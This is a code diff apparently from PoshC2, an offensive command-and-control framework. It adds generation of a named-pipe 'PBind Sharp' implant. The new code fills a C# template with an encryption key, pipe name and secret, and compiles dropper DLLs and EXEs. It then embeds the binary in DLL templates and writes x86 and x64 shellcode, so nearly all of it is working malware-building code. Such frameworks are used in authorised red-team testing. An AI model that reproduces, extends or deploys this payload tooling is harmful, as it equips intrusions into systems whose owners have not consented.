@@ -2,6 +2,7 @@ from io import StringIO
 import gzip, base64, subprocess, os, hashlib
 
 from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, DefaultMigrationProcess, DatabaseType
+from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName
 from poshc2.Colours import Colours
 from poshc2.Utils import gen_key, randomuri, formStrMacro, formStr, offsetFinder
 
@@ -16,8 +17,8 @@ class Payloads(object):
 
     quickstart = None
 
-    def __init__(self, KillDate, Key, Insecure, UserAgent, Referrer, ConnectURL, BaseDirectory, URLID = None, ImplantType = "", PowerShellProxyCommand = ""):
-        
+    def __init__(self, KillDate, Key, Insecure, UserAgent, Referrer, ConnectURL, BaseDirectory, URLID = None, ImplantType = "", PowerShellProxyCommand = "", PBindPipeName=DefaultPBindPipeName, PBindSecret=DefaultPBindSecret):        
+
         if not URLID:
             URLID = get_default_url_id()
 
@@ -37,6 +38,9 @@ class Payloads(object):
         self.UserAgent = UserAgent
         self.Referrer = Referrer
         self.ConnectURL = ConnectURL
+        self.BaseDirectory = BaseDirectory
+        self.PBindPipeName = PBindPipeName if PBindPipeName else DefaultPBindPipeName
+        self.PBindSecret = PBindSecret if PBindSecret else DefaultPBindSecret
         self.BaseDirectory = BaseDirectory
         self.PSDropper = ""
         self.PyDropper = ""
@@ -167,6 +171,36 @@ class Payloads(object):
         subprocess.check_output(compileexe, shell=True)
         self.QuickstartLog("C# Dropper EXE written to: %s%sdropper_cs.exe" % (self.BaseDirectory, name))
 
+        # Create PBind Sharp DLL
+        with open("%spbind.cs" % PayloadTemplatesDirectory, 'r') as f:
+            content = f.read()
+        cs = str(content).replace("#REPLACEKEY#", self.Key)
+        cs = cs.replace("#REPLACEPBINDPIPENAME#", self.PBindPipeName)
+        cs = cs.replace("#REPLACEPBINDSECRET#", self.PBindSecret)
+
+        self.QuickstartLog(f"C# PBind Dropper Payload written to: %s%spbind.cs with pipe name: {self.PBindPipeName} and secret: {self.PBindSecret}" % (self.BaseDirectory, name))
+        filename = "%s%spbind.cs" % (self.BaseDirectory, name)
+        output_file = open(filename, 'w')
+        output_file.write(str(cs))
+        output_file.close()
+        if os.name == 'nt':
+            compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:library -out:%s%spbind_cs.dll %s%spbind.cs " % (self.BaseDirectory, name, self.BaseDirectory, name)
+            compileexe = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:exe -out:%s%spbind_cs.exe %s%spbind.cs " % (self.BaseDirectory, name, self.BaseDirectory, name)
+        else:
+            compile = "mono-csc %s%spbind.cs -out:%sPB.dll -target:library -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory)
+            compileexe = "mono-csc %s%spbind.cs -out:%sPB.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory)
+        subprocess.check_output(compile, shell=True)
+        self.QuickstartLog("C# PBind Dropper DLL written to: %s%spbind_cs.dll" % (self.BaseDirectory, name))
+        subprocess.check_output(compileexe, shell=True)
+        self.QuickstartLog("C# PBind Dropper EXE written to: %s%spbind_cs.exe" % (self.BaseDirectory, name))
+        os.rename("%sPB.exe" % (self.BaseDirectory), "%s%spbind_cs.exe" % (self.BaseDirectory, name))
+        os.rename("%sPB.dll" % (self.BaseDirectory), "%s%spbind_cs.dll" % (self.BaseDirectory, name))
+        self.QuickstartLog("")
+        if self.PBindPipeName != DefaultPBindPipeName or self.PBindSecret != DefaultPBindSecret:
+            self.QuickstartLog(f"pbind-connect hostname {self.PBindPipeName} {self.PBindSecret}")
+        else:
+            self.QuickstartLog("pbind-connect hostname")
+
     def PatchBytes(self, filename, dll, offset, payloadtype, name=""):
         filename = "%s%s" % (self.BaseDirectory, filename)
         output_file = open(filename, 'wb')
@@ -203,6 +237,13 @@ class Payloads(object):
             payload = base64.b64encode(b64gzip.encode('UTF-16LE'))
             patch = payload.decode("utf-8")
             patchlen = 8000 - len(patch)
+
+        elif payloadtype == "PBindSharp":
+            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "pbind_cs.exe")
+            with open(srcfilename, "rb") as b:
+                dllbase64 = base64.b64encode(b.read()).decode("utf-8")
+            patchlen = 32000 - len((dllbase64))
+            patch = dllbase64 
 
         patch2 = ""
         patch2 = patch2.ljust(patchlen, '\x00')
@@ -242,6 +283,8 @@ class Payloads(object):
         self.CreateDll(f"{name}Sharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", "Sharp", name)
         self.CreateDll(f"{name}PBind_v4_x86.dll", f"{PayloadTemplatesDirectory}Posh_v4_x86_dll.b64", "PBind", name)
         self.CreateDll(f"{name}PBind_v4_x64.dll", f"{PayloadTemplatesDirectory}Posh_v4_x64_dll.b64", "PBind", name)
+        self.CreateDll(f"{name}PBindSharp_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", "PBindSharp", name)
+        self.CreateDll(f"{name}PBindSharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", "PBindSharp", name)
 
     def CreateShellcode(self, name=""):
         self.QuickstartLog(Colours.END)
@@ -257,6 +300,8 @@ class Payloads(object):
         self.CreateShellcodeFile(f"{name}Sharp_v4_x64_Shellcode.bin", f"{name}Sharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", "Sharp", name)
         self.CreateShellcodeFile(f"{name}PBind_v4_x86_Shellcode.bin", f"{name}PBind_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x86_Shellcode.b64", "PBind", name)
         self.CreateShellcodeFile(f"{name}PBind_v4_x64_Shellcode.bin", f"{name}PBind_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x64_Shellcode.b64", "PBind", name)
+        self.CreateShellcodeFile(f"{name}PBindSharp_v4_x86_Shellcode.bin", f"{name}PBindSharp_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", "PBindSharp", name)
+        self.CreateShellcodeFile(f"{name}PBindSharp_v4_x64_Shellcode.bin", f"{name}PBindSharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", "PBindSharp", name)
 
     def CreateSCT(self):
         basefile = self.CreateRawBase()
